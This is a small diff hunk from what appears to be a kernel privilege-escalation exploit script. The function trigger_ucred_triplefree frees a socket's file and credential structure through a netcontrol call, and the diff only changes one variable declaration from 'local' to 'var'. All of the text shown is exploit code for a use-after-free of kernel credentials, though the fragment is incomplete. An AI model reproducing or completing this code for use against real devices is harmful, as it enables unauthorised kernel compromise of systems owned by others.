@@ -1412,7 +1412,7 @@ function trigger_ucred_triplefree() {
     setuid(1);
 
     // 5) unregister → free file + ucred
-    local ctrl_buf = malloc(8); 
+    var ctrl_buf = malloc(8); 
     write32(ctrl_buf, uaf_socket);
     netcontrol(-1, 0x20000007, ctrl_buf, 8);
 
